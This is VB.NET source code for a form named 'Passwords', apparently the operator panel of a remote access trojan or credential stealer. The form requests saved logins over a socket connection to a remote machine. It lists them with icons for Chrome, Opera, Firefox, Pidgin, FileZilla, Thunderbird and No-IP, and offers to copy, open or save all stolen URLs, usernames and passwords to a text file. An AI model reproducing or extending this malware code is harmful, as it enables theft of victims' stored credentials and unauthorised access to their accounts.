Imports Microsoft.VisualBasic.CompilerServices
Imports System.IO
Public Class Passwords
    Public CountGroupFileZilla As Integer
    Public CountGroupFireFox As Integer
    Public CountGroupNO_IP As Integer
    Public CountGroupPidgin As Integer
    Public CountGroupsChrome As Integer
    Public CountGroupsOpera As Integer
    Public Path As String
    Public Sock As Integer
    Public T As String
    Public TH As String
    Public Sub New()
        Me.CountGroupsChrome = 0
        Me.CountGroupsOpera = 0
        Me.CountGroupPidgin = 0
        Me.CountGroupFileZilla = 0
        Me.CountGroupNO_IP = 0
        Me.CountGroupFireFox = 0
        Me.Path = String.Empty
        Me.T = DateTime.Now.ToString("yyyy-MM-dd")
        Me.TH = DateAndTime.TimeOfDay.ToString("h-mm-ss tt")
        Me.InitializeComponent()
    End Sub

    Private Sub CopyPasswordToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CopyPasswordToolStripMenuItem.Click
        Try
            If (Me.ListView1.SelectedItems.Item(0).SubItems.Item(2).Text <> Nothing) Then
                My.Computer.Clipboard.SetText(Me.ListView1.SelectedItems.Item(0).SubItems.Item(2).Text)
            End If
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub CopyUserToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CopyUserToolStripMenuItem.Click
        Try
            If (Me.ListView1.SelectedItems.Item(0).SubItems.Item(1).Text <> Nothing) Then
                My.Computer.Clipboard.SetText(Me.ListView1.SelectedItems.Item(0).SubItems.Item(1).Text)
            End If
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub OpenURLToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles OpenURLToolStripMenuItem.Click
        Try
            If (Me.ListView1.SelectedItems.Item(0).SubItems.Item(0).Text <> Nothing) Then
                Process.Start(Me.ListView1.SelectedItems.Item(0).SubItems.Item(0).Text)
            End If
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub Passwords_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        My.Forms.Main.s.Send(Me.Sock, "Abort")
    End Sub

    Private Sub Passwords_Load(sender As Object, e As EventArgs) Handles Me.Load
        Me.ImageList1.Images.Add("1", My.Resources.rsz_1481030093_chrome_512)
        Me.ImageList1.Images.Add("2", My.Resources._1481030115_Opera)
        Me.ImageList1.Images.Add("3", My.Resources.rsz_1481030174_pidgin)
        Me.ImageList1.Images.Add("4", My.Resources.rsz_1481030189_filezilla)
        Me.ImageList1.Images.Add("5", My.Resources.rsz_1481030222_firefox)
        Me.ImageList1.Images.Add("6", My.Resources.rsz_1481030243_ip_block)
        Me.ImageList1.Images.Add("7", My.Resources._1481030260_thunderbird_icon)
        Me.ListView1.GridLines = My.Forms.Main.ListView1.GridLines
        My.Forms.Main.s.Send(Me.Sock, ("Get" & My.Forms.Main.Key))
    End Sub

    Private Sub SaveAllToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SaveAllToolStripMenuItem.Click
        If (Me.ListView1.Items.Count > 0) Then
            Dim dialog As New SaveFileDialog
            dialog.Filter = "Passwords|*.txt"
            dialog.FileName = "Passwords"
            If (dialog.ShowDialog = DialogResult.OK) Then
                Try
                    Dim enumerator As IEnumerator
                    Dim contents As String = String.Empty
                    Try
                        enumerator = Me.ListView1.Items.GetEnumerator
                        Do While enumerator.MoveNext
                            Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                            contents = String.Concat(New String() {contents, "URL : ", current.SubItems.Item(0).Text, ChrW(13) & ChrW(10) & "User : ", current.SubItems.Item(1).Text, ChrW(13) & ChrW(10) & "Password : ", current.SubItems.Item(2).Text, ChrW(13) & ChrW(10)})
                        Loop
                    Finally
                        If TypeOf enumerator Is IDisposable Then
                            TryCast(enumerator, IDisposable).Dispose()
                        End If
                    End Try
                    File.WriteAllText(dialog.FileName, contents)
                    MessageBox.Show(("Passwords have been Saved successfully at: " & dialog.FileName & "!"), "Successfully!", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1)
                    ProjectData.ClearProjectError()
                End Try
            End If
        End If
    End Sub
End Class